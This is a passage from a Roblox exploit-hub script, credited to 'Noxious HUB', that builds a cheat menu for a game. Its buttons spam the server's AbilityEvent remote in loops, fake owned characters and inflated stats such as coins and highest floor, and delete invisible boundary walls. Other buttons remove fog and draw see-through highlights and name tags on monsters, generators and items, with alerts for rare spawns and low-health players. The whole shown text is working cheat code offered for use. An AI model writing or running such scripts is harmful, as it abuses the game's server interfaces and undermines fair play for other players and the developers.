				[2] = CFrame.new(-179.29843139648438, 146.2311248779297, -164.61495971679688) * CFrame.Angles(3.1415927410125732, 0.4017193913459778, -3.141592502593994),
				[3] = game:GetService("Players").LocalPlayer.Character
			}

			game:GetService("ReplicatedStorage").Events.AbilityEvent:InvokeServer(unpack(args))
		end

		-- Función principal para ejecutar el evento cada segundo
		local function autoInvoke()
			while activedasdasd do
				invokeAbilityEvent()  -- Ejecutar el evento
				wait(1)  -- Esperar 1 segundo antes de ejecutar nuevamente
			end
		end

	end)
end;
task.spawn(C_152);
-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
local function C_157()
	local script = G2L["157"];
	-- Variable para controlar si el script está activo
	local scriptEnabled = false

	script.Parent.MouseButton1Click:Connect(function()
		-- Función para ejecutar el evento AbilityEvent
		local function invokeAbilityEvent()
			local args = {
				[1] = game:GetService("Players").LocalPlayer.Character,
				[2] = CFrame.new(-65.78115844726562, 145.7693634033203, 86.53424072265625) * CFrame.Angles(4.4136689858476075e-09, 2.9576958503043716e-16, 5.338084818617972e-08),
				[3] = false
			}
			game:GetService("ReplicatedStorage").Events.AbilityEvent:InvokeServer(unpack(args))
		end

		-- Función principal para ejecutar el evento cada 0.3 segundos
		local function autoInvoke()
			while scriptEnabled do
				invokeAbilityEvent() -- Ejecutar el evento
				wait(0.3) -- Esperar 0.3 segundos antes de repetir
			end
		end
		-- Verificar si el script está activo
		if scriptEnabled then
			script.Parent.Text = "Auto Ability: Off"
			scriptEnabled = false
		else
			script.Parent.Text = "Auto Ability: On"
			scriptEnabled = true
			autoInvoke() -- Iniciar la función autoInvoke cuando el script está activo
		end




	end)
end;
task.spawn(C_157);
-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
local function C_15a()
	local script = G2L["15a"];
	-- Variable para controlar si el script está activo
	local scriptEnabled = false

	script.Parent.MouseButton1Click:Connect(function()
		local args = {
			[1] = game:GetService("Players").LocalPlayer.Character,
			[2] = CFrame.new(-65.78115844726562, 145.7693634033203, 86.53424072265625) * CFrame.Angles(4.4136689858476075e-09, 2.9576958503043716e-16, 5.338084818617972e-08),
			[3] = false
		}
		game:GetService("ReplicatedStorage").Events.AbilityEvent:InvokeServer(unpack(args))

	end)
end;
task.spawn(C_15a);
-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
local function C_15f()
	local script = G2L["15f"];
	local activedasdasd = false
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer.UserId
		local folder = game.ReplicatedStorage.PlayerData:FindFirstChild(player).Towers

		local names = {"Boxten", "Brightney", "Cosmo", "Finn", "Flutter", "Gigi", "Glisten", "Goob", "Poppy", "RazzleDazzle", "Rodger", "Scraps", "Shrimpo", "Teagan", "Tisha", "Toodles", "Sprout", "Vee", "Dandy", "Shelly", "Pebble", "Astro", "Dandy"}
		for _, name in pairs(names) do
			local toon = Instance.new("StringValue", folder)
			toon.Name = name
			toon.Value = "Default"
		end
		game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
	end)
end;
task.spawn(C_15f);
-- StarterGui.DebugVersion.Title.script_content.MainFive.asd.LocalScript
local function C_162()
	local script = G2L["162"];
	script.Parent.MouseButton1Click:Connect(function()
		-- Simulate Higher Stats for the Local Player
		-- By G0bbyD0llan

		-- Get the player's ID
		local playerId = game.Players.LocalPlayer.UserId

		-- Helper function to set stats
		local function updateStats(towerFolder)
			if not towerFolder then
				warn("Towers folder is missing. Can't update stats!")
				return
			end

			-- Here's the stats we want to modify
			local statsToSet = {
				Blackouts = 1296,
				Coin = 55403,
				DandyItemsPurchased = 4576,
				FloorsTraveled = 56319,
				GeneratorsCompleted = 136431,
				HighestFloor = 279
			}

			-- Update each stat
			for statName, newValue in pairs(statsToSet) do
				local stat = towerFolder:FindFirstChild(statName)
				if stat and stat:IsA("ValueBase") then
					stat.Value = newValue
					print(statName .. " updated to " .. newValue)
				else
					warn("Stat '" .. statName .. "' is missing or not a valid Value object.")
				end
			end
		end

		-- Look for the player's data in ReplicatedStorage
		local playerData = game.ReplicatedStorage.PlayerData:FindFirstChild(playerId)

		if playerData then
			local towersFolder = playerData:FindFirstChild("Towers")
			updateStats(towersFolder)
			updateStats(playerData)
		else
			warn("Player data not found for ID: " .. playerId)
		end

	end)
end;
task.spawn(C_162);
-- StarterGui.DebugVersion.Title.script_content.MainFive.Aut.LocalScript
local function C_165()
	local script = G2L["165"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.MainTwo.Visible = false
		script.Parent.Parent.Parent.MainThird.Visible = false
		script.Parent.Parent.Parent.Main.Visible = false
		script.Parent.Parent.Parent.MainFour.Visible = false
		script.Parent.Parent.Parent.MainFive.Visible = false
		script.Parent.Parent.Parent.MainSix.Visible = true
	end)
end;
task.spawn(C_165);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_16b()
	local script = G2L["16b"];
	local function credit()
		task.spawn(function()
			-- Crear un script en el espacio de trabajo o ServerScriptService
			local messageText = "ALL CREDITS TO Noxious HUB / unable ¡¡¡" -- Texto del mensaje
			local blinkInterval = 0.01 -- Tiempo entre cada parpadeo (en segundos)
			local totalBlinkTime = 1 -- Tiempo total que el mensaje debe parpadear (en segundos)

			local elapsedTimee = 0

			while elapsedTimee < totalBlinkTime do
				-- Crear el mensaje
				local message = Instance.new("Message")
				message.Text = messageText
				message.Parent = game.Workspace -- Hacer visible el mensaje en el Workspace

				-- Esperar el tiempo de parpadeo
				wait(blinkInterval)

				-- Eliminar el mensaje
				message:Destroy()

				-- Esperar nuevamente el tiempo de parpadeo
				wait(blinkInterval)

				-- Incrementar el tiempo transcurrido
				elapsedTimee = elapsedTimee + (blinkInterval * 2)
				print(elapsedTimee)
			end

		end)
	end
	function becomeCharacter()


		local playersService = game:GetService("Players")
		local replicatedStorage = game:GetService("ReplicatedStorage")
		local localPlayer = playersService.LocalPlayer
		local args = {[1] = false}

		replicatedStorage.Events.UpdateSpawnedIn:FireServer(unpack(args))

		local character = localPlayer.Character
		local humanoidRootPartPosition

		if character then
			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
			if humanoidRootPart then
				humanoidRootPartPosition = humanoidRootPart.CFrame
			end
		end

		if character then
			local humanoid = character:FindFirstChildWhichIsA("Humanoid")
			if humanoid then
				humanoid.Health = 0
			end
		end

		localPlayer.CharacterAdded:Wait()
		local newCharacter = localPlayer.Character
		if not newCharacter then return end

		local function updateCharacter()
			local camera = workspace.CurrentCamera
			local cameraCFrame = camera.CFrame
			local humanoid = newCharacter:FindFirstChildWhichIsA("Humanoid")
			if not humanoid then return end

			local humanoidClone = humanoid:Clone()
			humanoidClone.Parent = newCharacter
			localPlayer.Character = nil
			humanoidClone.BreakJointsOnDeath = true
			humanoidClone.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
			humanoid:Destroy()
			localPlayer.Character = newCharacter
			camera.CameraSubject = humanoidClone
			camera.CFrame = cameraCFrame

			local humanoidRootPart = newCharacter:FindFirstChild("HumanoidRootPart")
			if humanoidRootPart and humanoidRootPartPosition then
				humanoidRootPart.CFrame = humanoidRootPartPosition
			end

			local animate = newCharacter:FindFirstChild("Animate")
			if animate then
				animate.Disabled = true
				wait()
				animate.Disabled = false
			end

			humanoidClone.Health = humanoidClone.MaxHealth
		end

		newCharacter:WaitForChild("Humanoid", 5)
		updateCharacter()
		wait(1)
		humanoidRootPartPosition = nil
	end

	script.Parent.MouseButton1Click:Connect(function()
		credit()
		becomeCharacter()
	end)
end;
task.spawn(C_16b);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_16e()
	local script = G2L["16e"];
	script.Parent.MouseButton1Click:Connect(function()
		game.Lighting.FogEnd = math.huge  
		game.Lighting.FogStart = math.huge  
		game.Lighting.FogColor = Color3.new(1, 1, 1)  
	end)
end;
task.spawn(C_16e);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_171()
	local script = G2L["171"];
	script.Parent.MouseButton1Click:Connect(function()
		local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")

		if currentRoom then
			-- Busca un modelo dentro de "CurrentRoom"
			local model = currentRoom:FindFirstChildOfClass("Model")

			if model then
				-- Busca una carpeta llamada "FreeArea" dentro del modelo
				local freeArea = model:FindFirstChild("FreeArea")

				if freeArea then
					-- Recorre todos los objetos dentro de "FreeArea" para eliminar los que se llaman "InvisBorder"
					for _, child in ipairs(freeArea:GetChildren()) do
						if child:IsA("Part") and child.Name == "InvisBorder" then
							child:Destroy()
						end
					end
				else
					warn("No se encontró la carpeta 'FreeArea' dentro del modelo.")
				end
			else
				warn("No se encontró un modelo dentro de 'CurrentRoom'.")
			end
		else
			warn("No se encontró la carpeta 'CurrentRoom' en el Workspace.")
		end

	end)
end;
task.spawn(C_171);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_174()
	local script = G2L["174"];
	local function playSound(soundId, speed)
		-- Create a new Sound object
		local sound = Instance.new("Sound")

		-- Set the SoundId to the provided soundId
		sound.SoundId = "rbxassetid://" .. soundId

		-- Set the Parent to workspace
		sound.Parent = workspace

		sound.PlaybackSpeed = speed or 1
		-- Play the sound
		sound:Play()

		-- Destroy the sound object after it finishes playing
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	script.Parent.MouseButton1Click:Connect(function()
		local Players = game:GetService("Players")
		local localPlayer = Players.LocalPlayer -- El jugador que ejecuta el script

		-- Tabla para rastrear modelos ya notificados
		local notifiedModels = {}

		-- Función para enviar una notificación
		local function sendNotification(modelName)
			--notify- Example usage
			playSound("478544929", 1)
			game.StarterGui:SetCore("SendNotification", {
				Title = "Low Health",
				Text = "Player " .. modelName .. " has low health.",
				Duration = 5,
			})
		end

		-- Función principal para revisar los modelos
		local function monitorLowHealth()
			local inGamePlayers = workspace:FindFirstChild("InGamePlayers")
			if inGamePlayers then
				for _, model in ipairs(inGamePlayers:GetChildren()) do
					-- Saltar el modelo si tiene el mismo nombre que el jugador
					if model.Name ~= localPlayer.Name and model:IsA("Model") then
						local humanoid = model:FindFirstChildOfClass("Humanoid")
						if humanoid and humanoid.Health == 1 then
							-- Notificar si aún no se ha hecho
							if not notifiedModels[model] then
								sendNotification(model.Name)
								notifiedModels[model] = true


							end
						elseif humanoid and (humanoid.Health == 2 or humanoid.Health == 3) then
							-- Eliminar Highlight y limpiar notificación si la salud se recupera
							local highlight = model:FindFirstChildOfClass("Highlight")
							if highlight then
								highlight:Destroy()
							end
							notifiedModels[model] = nil
						end
					end
				end
			else
				warn("No se encontró la carpeta InGamePlayers en Workspace.")
			end
		end



		game:GetService("RunService").Heartbeat:Connect(function()
			monitorLowHealth()
		end)
	end)
end;
task.spawn(C_174);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_177()
	local script = G2L["177"];
	local function playSound(soundId, speed)
		-- Create a new Sound object
		local sound = Instance.new("Sound")

		-- Set the SoundId to the provided soundId
		sound.SoundId = "rbxassetid://" .. soundId

		-- Set the Parent to workspace
		sound.Parent = workspace

		sound.PlaybackSpeed = speed or 1
		-- Play the sound
		sound:Play()

		-- Destroy the sound object after it finishes playing
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	script.Parent.MouseButton1Click:Connect(function()
		local toggleEnabled = true
		print("Toggle changed:", toggleEnabled)

		if toggleEnabled then
			local notifiedMonsters = {} -- Tabla para rastrear monstruos ya notificados

			-- Función para enviar una notificación personalizada
			local function sendNotification(monsterName)
				--send notification using setcore if a rare monster appeared with name
				--print("Sending notification for:", monsterName)
				game.StarterGui:SetCore("SendNotification", {
					Title = "Rare Monster Appeared!",
					Text = "A rare monster, " .. monsterName .. ", has appeared in the room!",
					Duration = 5,
					Button1 = "OK",
				})
				playSound("478544929", 1)

			end

			-- Lista de nombres de monstruos a buscar
			local targetMonsters = {
				"AstroMonster",
				"VeeMonster",
				"SproutMonster",
				"PebbleMonster",
				"ShellyMonster",
				"DandyMonster"
			}

			-- Busca la carpeta CurrentRoom en Workspace
			local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
			if currentRoom then
				-- Busca continuamente la carpeta Monsters dentro de CurrentRoom
				while toggleEnabled do
					for _, model in ipairs(currentRoom:GetChildren()) do
						if model:IsA("Model") then
							-- Busca la carpeta Monsters dentro del modelo de CurrentRoom
							local monstersFolder = model:FindFirstChild("Monsters")
							if monstersFolder then
								-- Revisa los monstruos dentro de Monsters
								for _, monster in ipairs(monstersFolder:GetChildren()) do
									if table.find(targetMonsters, monster.Name) and not notifiedMonsters[monster.Name] then
										sendNotification(monster.Name) -- Envía notificación personalizada
										notifiedMonsters[monster.Name] = true -- Marca el monstruo como notificado
									end
								end
							end
						end
					end

					-- Limpia los monstruos que ya no están en Monsters
					for monsterName, _ in pairs(notifiedMonsters) do
						local stillExists = false
						for _, model in ipairs(currentRoom:GetChildren()) do
							local monstersFolder = model:FindFirstChild("Monsters")
							if monstersFolder and monstersFolder:FindFirstChild(monsterName) then
								stillExists = true
								break
							end
						end
						if not stillExists then
							notifiedMonsters[monsterName] = nil -- Elimina monstruos que ya no están
						end
					end

					task.wait(5) -- Verifica nuevamente cada 5 segundos
				end
			else
				warn("No se encontró la carpeta CurrentRoom en Workspace.")
			end
		end
	end)
end;
task.spawn(C_177);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_17a()
	local script = G2L["17a"];
	local function playSound(soundId, speed)
		-- Create a new Sound object
		local sound = Instance.new("Sound")

		-- Set the SoundId to the provided soundId
		sound.SoundId = "rbxassetid://" .. soundId

		-- Set the Parent to workspace
		sound.Parent = workspace

		sound.PlaybackSpeed = speed or 1
		-- Play the sound
		sound:Play()

		-- Destroy the sound object after it finishes playing
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	script.Parent.MouseButton1Click:Connect(function()
		local toggleEnabled = true
		print("Toggle changed:", toggleEnabled)

		if toggleEnabled then
			local notifiedModels = {} -- Tabla para rastrear modelos ya notificados

			-- Función para enviar una notificación personalizada
			local function sendNotification(itemName)
				--send notification about rare item found using setcore
				game.StarterGui:SetCore("SendNotification", {
					Title = "Rare Item Found",
					Text = "rare item named " .. itemName .. "! is here",
					Duration = 5,
					Button1 = "OK",
				})
				playSound("478544929", 1)
			end


			-- Lista de nombres de modelos a buscar
			local targetModels = {
				"Bandage",
				"HealthKit",
				"SmokeBomb",
				"EjectButton",
				"Valve",
				"Box chocolates",
				"AirHorn",
				"EnigmaCandy",
				"JumperCable",
				"PopBottle"
			}

			-- Busca la carpeta CurrentRoom en Workspace
			local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
			if currentRoom then
				-- Verifica continuamente la carpeta Items
				while toggleEnabled do
					for _, model in ipairs(currentRoom:GetChildren()) do
						if model:IsA("Model") then
							-- Busca la carpeta Items dentro del modelo
							local itemsFolder = model:FindFirstChild("Items")
							if itemsFolder then
								-- Revisa los modelos dentro de Items
								for _, item in ipairs(itemsFolder:GetChildren()) do
									if table.find(targetModels, item.Name) and not notifiedModels[item.Name] then
										sendNotification(item.Name) -- Manda la notificación personalizada
										notifiedModels[item.Name] = true -- Marca el modelo como notificado
									end
								end
							end
						end
					end

					-- Limpia los modelos que ya no están en Items
					for modelName, _ in pairs(notifiedModels) do
						local stillExists = false
						for _, model in ipairs(currentRoom:GetChildren()) do
							local itemsFolder = model:FindFirstChild("Items")
							if itemsFolder and itemsFolder:FindFirstChild(modelName) then
								stillExists = true
								break
							end
						end
						if not stillExists then
							notifiedModels[modelName] = nil -- Elimina modelos que ya no están
						end
					end

					task.wait(5) -- Verifica nuevamente cada 5 segundos
				end
			else
				warn("No se encontró la carpeta CurrentRoom en Workspace.")
			end
		end
	end)
end;
task.spawn(C_17a);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_17d()
	local script = G2L["17d"];
	local function playSound(soundId, speed)
		-- Create a new Sound object
		local sound = Instance.new("Sound")

		-- Set the SoundId to the provided soundId
		sound.SoundId = "rbxassetid://" .. soundId

		-- Set the Parent to workspace
		sound.Parent = workspace

		sound.PlaybackSpeed = speed or 1
		-- Play the sound
		sound:Play()

		-- Destroy the sound object after it finishes playing
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	script.Parent.MouseButton1Click:Connect(function()
		-- Crear un ScreenGui y configurar el contador de FPS
		local screenGui = Instance.new("ScreenGui")
		local fpsFrame = Instance.new("Frame")
		local fpsLabel = Instance.new("TextLabel")

		-- Añadir el GUI al PlayerGui del jugador
		screenGui.Name = "FPSCounterGui"
		screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

		-- Configurar el marco del contador
		fpsFrame.Name = "FPSCounterFrame"
		fpsFrame.Parent = screenGui
		fpsFrame.AnchorPoint = Vector2.new(0, 0)
		fpsFrame.Position = UDim2.new(0.01, 0, 0.01, 0) -- Arriba a la izquierda
		fpsFrame.Size = UDim2.new(0, 100, 0, 30)
		fpsFrame.BackgroundColor3 = Color3.new(0, 0, 0)
		fpsFrame.BackgroundTransparency = 0.5

		-- Configurar la etiqueta para mostrar los FPS
		fpsLabel.Name = "FPSCounterLabel"
		fpsLabel.Parent = fpsFrame
		fpsLabel.AnchorPoint = Vector2.new(0.5, 0.5)
		fpsLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
		fpsLabel.Size = UDim2.new(1, -10, 1, -10)
		fpsLabel.BackgroundTransparency = 1
		fpsLabel.Font = Enum.Font.Code
		fpsLabel.Text = "FPS: 0"
		fpsLabel.TextColor3 = Color3.new(0, 1, 0) -- Comienza en verde
		fpsLabel.TextScaled = true

		-- Función para actualizar el contador de FPS
		local runService = game:GetService("RunService")
		local lastTime = tick()
		local frameCount = 0

		runService.RenderStepped:Connect(function()
			frameCount = frameCount + 1
			local currentTime = tick()
			if currentTime - lastTime >= 1 then
				local fps = frameCount / (currentTime - lastTime)
				frameCount = 0
				lastTime = currentTime

				-- Actualizar el texto del contador
				fpsLabel.Text = string.format("FPS: %.0f", fps)

				-- Cambiar el color del texto según los FPS
				if fps >= 50 then
					fpsLabel.TextColor3 = Color3.new(0, 1, 0) -- Verde para buen rendimiento
				elseif fps >= 30 then
					fpsLabel.TextColor3 = Color3.new(1, 1, 0) -- Amarillo para rendimiento moderado
				else
					fpsLabel.TextColor3 = Color3.new(1, 0, 0) -- Rojo para bajo rendimiento
				end
			end
		end)

	end)
end;
task.spawn(C_17d);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_180()
	local script = G2L["180"];
	local function playSound(soundId, speed)
		-- Create a new Sound object
		local sound = Instance.new("Sound")

		-- Set the SoundId to the provided soundId
		sound.SoundId = "rbxassetid://" .. soundId

		-- Set the Parent to workspace
		sound.Parent = workspace

		sound.PlaybackSpeed = speed or 1
		-- Play the sound
		sound:Play()

		-- Destroy the sound object after it finishes playing
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	script.Parent.MouseButton1Click:Connect(function()
		game:GetService("Players").LocalPlayer.PlayerGui.MainGui.MenuController.Disabled = true
		game:GetService("Players").LocalPlayer.PlayerGui.MainGui.MenuController.Enabled = false
	end)
end;
task.spawn(C_180);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_183()
	local script = G2L["183"];
	local function playSound(soundId, speed)
		-- Create a new Sound object
		local sound = Instance.new("Sound")

		-- Set the SoundId to the provided soundId
		sound.SoundId = "rbxassetid://" .. soundId

		-- Set the Parent to workspace
		sound.Parent = workspace

		sound.PlaybackSpeed = speed or 1
		-- Play the sound
		sound:Play()

		-- Destroy the sound object after it finishes playing
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	local isEnabled = false
	local updateConnection
	local Toggle = script.Parent

	-- Función para agregar Highlight y NameTag a un monstruo
	local function addVisuals(monster)
		if not monster:FindFirstChildOfClass("Highlight") then
			local highlight = Instance.new("Highlight")
			highlight.Parent = monster
			highlight.FillColor = Color3.new(0, 1, 0) -- Verde
			highlight.OutlineColor = Color3.new(1, 1, 0) -- Amarillo
			highlight.FillTransparency = 0.3 -- Más opaco
		end

		if not monster:FindFirstChild("NameTag") then
			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = "NameTag"
			billboardGui.Parent = monster
			billboardGui.Size = UDim2.new(6, 0, 1.5, 0) -- Tamaño ligeramente más pequeño
			billboardGui.AlwaysOnTop = true
			billboardGui.MaxDistance = 1500 -- Distancia máxima reducida

			local textLabel = Instance.new("TextLabel")
			textLabel.Parent = billboardGui
			textLabel.Size = UDim2.new(1, 0, 1, 0)
			textLabel.BackgroundTransparency = 1
			textLabel.Text = monster.Name
			textLabel.TextColor3 = Color3.new(0, 0.5, 1) -- Azul
			textLabel.TextScaled = true -- Texto escalado
			textLabel.Font = Enum.Font.GothamBold -- Cambiado a GothamBold

			local uiStroke = Instance.new("UIStroke")
			uiStroke.Parent = textLabel
			uiStroke.Thickness = 2 -- Menos grueso
			uiStroke.Color = Color3.new(1, 1, 1) -- Blanco

			local uiGradient = Instance.new("UIGradient")
			uiGradient.Parent = textLabel
			uiGradient.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, Color3.new(0.5, 0.8, 1)), -- Azul claro
				ColorSequenceKeypoint.new(1, Color3.new(0, 0.5, 1)) -- Azul oscuro
			})
		end
	end

	-- Función para eliminar Highlight y NameTag de un monstruo
	local function removeVisuals(monster)
		local highlight = monster:FindFirstChildOfClass("Highlight")
		if highlight then
			highlight:Destroy()
		end

		local nameTag = monster:FindFirstChild("NameTag")
		if nameTag then
			nameTag:Destroy()
		end
	end

	-- Función principal para manejar los monstruos en la habitación actual
	local function processMonsters(isEnabled)
		local currentRoom = workspace:FindFirstChild("CurrentRoom")
		if not currentRoom then return end

		for _, item in ipairs(currentRoom:GetChildren()) do
			if item:IsA("Model") then
				local monstersFolder = item:FindFirstChild("Monsters")
				if monstersFolder then
					for _, monster in ipairs(monstersFolder:GetChildren()) do
						if monster:IsA("Model") then
							if isEnabled then
								addVisuals(monster)
							else
								removeVisuals(monster)
							end
						end
					end
				end
			end
		end
	end

	-- Toggle para activar o desactivar el efecto
	Toggle.MouseButton1Click:Connect(function()
		isEnabled = not isEnabled
		if isEnabled then
			script.Parent.TextColor3 = Color3.new(0.333333, 1, 0)
		else
			script.Parent.TextColor3 = Color3.new(1, 0, 0)
		end
		-- Detén cualquier conexión previa
		if updateConnection then
			updateConnection:Disconnect()
			updateConnection = nil
		end

		if isEnabled then
			-- Ciclo para actualizar constantemente
			updateConnection = game:GetService("RunService").Heartbeat:Connect(function()
				processMonsters(true)
			end)
		else
			-- Limpia los efectos si está desactivado
			processMonsters(false)
		end
	end)

end;
task.spawn(C_183);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_186()
	local script = G2L["186"];
	local function playSound(soundId, speed)
		-- Create a new Sound object
		local sound = Instance.new("Sound")

		-- Set the SoundId to the provided soundId
		sound.SoundId = "rbxassetid://" .. soundId

		-- Set the Parent to workspace
		sound.Parent = workspace

		sound.PlaybackSpeed = speed or 1
		-- Play the sound
		sound:Play()

		-- Destroy the sound object after it finishes playing
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	-- Variable para detener el bucle
	local generatorsEnabled = false
	local generatorUpdateConnection

	-- Función para agregar Highlight y NameTag a un generador
	local function addVisuals(generator)
		if not generator:FindFirstChildOfClass("Highlight") then
			local highlight = Instance.new("Highlight")
			highlight.Parent = generator
			highlight.FillColor = Color3.fromRGB(0, 162, 255) -- Azul
			highlight.OutlineColor = Color3.fromRGB(138, 43, 226) -- Púrpura
			highlight.FillTransparency = 0.3 -- Más opaco
		end

		if not generator:FindFirstChild("NameTag") then
			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = "NameTag"
			billboardGui.Parent = generator
			billboardGui.Size = UDim2.new(6, 0, 1.5, 0) -- Tamaño ligeramente más pequeño
			billboardGui.AlwaysOnTop = true
			billboardGui.MaxDistance = 1500 -- Distancia máxima ajustada

			local textLabel = Instance.new("TextLabel")
			textLabel.Parent = billboardGui
			textLabel.Size = UDim2.new(1, 0, 1, 0)
			textLabel.BackgroundTransparency = 1
			textLabel.Text = generator.Name
			textLabel.TextColor3 = Color3.fromRGB(75, 0, 130) -- Índigo
			textLabel.TextScaled = true -- Texto escalado
			textLabel.Font = Enum.Font.GothamBold -- Fuente más moderna

			local uiStroke = Instance.new("UIStroke")
			uiStroke.Parent = textLabel
			uiStroke.Thickness = 3 -- Grosor del borde ajustado
			uiStroke.Color = Color3.fromRGB(255, 255, 255) -- Blanco

			local uiGradient = Instance.new("UIGradient")
			uiGradient.Parent = textLabel
			uiGradient.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, Color3.fromRGB(128, 0, 128)), -- Púrpura
				ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 255)) -- Magenta
			})
		end
	end

	-- Función para eliminar Highlight y NameTag de un generador
	local function removeVisuals(generator)
		local highlight = generator:FindFirstChildOfClass("Highlight")
		if highlight then
			highlight:Destroy()
		end

		local nameTag = generator:FindFirstChild("NameTag")
		if nameTag then
			nameTag:Destroy()
		end
	end

	-- Función principal para procesar los generadores
	local function processGenerators(enabled)
		local currentRoom = workspace:FindFirstChild("CurrentRoom")
		if not currentRoom then return end

		for _, item in pairs(currentRoom:GetChildren()) do
			if item:IsA("Model") then
				local generatorsFolder = item:FindFirstChild("Generators")
				if generatorsFolder then
					for _, generator in pairs(generatorsFolder:GetChildren()) do
						if generator:IsA("Model") then
							if enabled then
								addVisuals(generator)
							else
								removeVisuals(generator)
							end
						end
					end
				end
			end
		end
	end

	-- Toggle para activar o desactivar los generadores
	script.Parent.MouseButton1Click:Connect(function()
		generatorsEnabled = not generatorsEnabled
		if generatorsEnabled then
			script.Parent.TextColor3 = Color3.new(0.333333, 1, 0)
		else
			script.Parent.TextColor3 = Color3.new(1, 0, 0)
		end
		-- Detén cualquier conexión previa
		if generatorUpdateConnection then
			generatorUpdateConnection:Disconnect()
			generatorUpdateConnection = nil
		end

		if generatorsEnabled then
			-- Ciclo para actualizar constantemente
			generatorUpdateConnection = game:GetService("RunService").Heartbeat:Connect(function()
				processGenerators(true)
			end)
		else
			-- Limpia los efectos si está desactivado
			processGenerators(false)
		end
	end)

end;
task.spawn(C_186);
-- StarterGui.DebugVersion.Title.script_content.MainSix.callatt.LocalScript
local function C_189()
	local script = G2L["189"];
	local function playSound(soundId, speed)
		-- Create a new Sound object
		local sound = Instance.new("Sound")

		-- Set the SoundId to the provided soundId
		sound.SoundId = "rbxassetid://" .. soundId

		-- Set the Parent to workspace
		sound.Parent = workspace

		sound.PlaybackSpeed = speed or 1
		-- Play the sound
		sound:Play()

		-- Destroy the sound object after it finishes playing
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end
	-- Variables para controlar el estado
	local itemsEnabled = false
	local itemsUpdateConnection

	-- Toggle para activar/desactivar los ítems
	script.Parent.MouseButton1Click:Connect(function()
		itemsEnabled = not itemsEnabled

		-- Colores configurables
		local highlightOutlineColor = Color3.fromRGB(255, 223, 0) -- Dorado
		local highlightFillColor = Color3.fromRGB(255, 105, 180)  -- Rosa brillante

		-- Función para agregar Highlight y NameTag a un modelo
		local function addVisualsToModel(model)
			-- Agregar Highlight si no existe
			if not model:FindFirstChildOfClass("Highlight") then
				local highlight = Instance.new("Highlight")
				highlight.OutlineColor = highlightOutlineColor
				highlight.FillColor = highlightFillColor
				highlight.FillTransparency = 0.3 -- Más opaco
				highlight.Parent = model
			end

			-- Agregar NameTag si no existe
			if not model:FindFirstChild("NameTag") then
				local billboardGui = Instance.new("BillboardGui")
				billboardGui.Name = "NameTag"
				billboardGui.Parent = model
				billboardGui.Size = UDim2.new(6, 0, 1.5, 0) -- Tamaño ajustado
				billboardGui.AlwaysOnTop = true
				billboardGui.MaxDistance = 1500 -- Distancia máxima reducida

				local textLabel = Instance.new("TextLabel")
				textLabel.Parent = billboardGui
				textLabel.Size = UDim2.new(1, 0, 1, 0)
				textLabel.BackgroundTransparency = 1
				textLabel.Text = model.Name
				textLabel.TextColor3 = Color3.fromRGB(255, 182, 193) -- Rosa pastel
				textLabel.TextScaled = true -- Texto ajustado automáticamente
				textLabel.Font = Enum.Font.GothamBold -- Fuente moderna y clara

				-- Agregar borde al texto
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Parent = textLabel
				uiStroke.Thickness = 3 -- Grosor ajustado
				uiStroke.Color = Color3.fromRGB(255, 255, 255) -- Blanco

				-- Degradado de color en el texto
				local uiGradient = Instance.new("UIGradient")
				uiGradient.Parent = textLabel
				uiGradient.Color = ColorSequence.new({
					ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 105, 180)), -- Rosa
					ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 223, 0)) -- Dorado
				})
			end
		end

		-- Función para procesar los ítems
		local function processItems(enabled)
			local currentRoom = workspace:FindFirstChild("CurrentRoom")
			if not currentRoom or not currentRoom:IsA("Folder") then return end

			for _, item in pairs(currentRoom:GetChildren()) do
				if item:IsA("Model") then
					local itemsFolder = item:FindFirstChild("Items")
					if itemsFolder and itemsFolder:IsA("Folder") then
						for _, subItem in pairs(itemsFolder:GetChildren()) do
							if subItem:IsA("Model") then
								if enabled then
									addVisualsToModel(subItem)
								else
									-- Elimina Highlight y NameTag si está deshabilitado
									local highlight = subItem:FindFirstChildOfClass("Highlight")
									if highlight then
										highlight:Destroy()
									end
									local nameTag = subItem:FindFirstChild("NameTag")
									if nameTag then
										nameTag:Destroy()
									end
								end
							end
						end
					end
				end
			end
		end

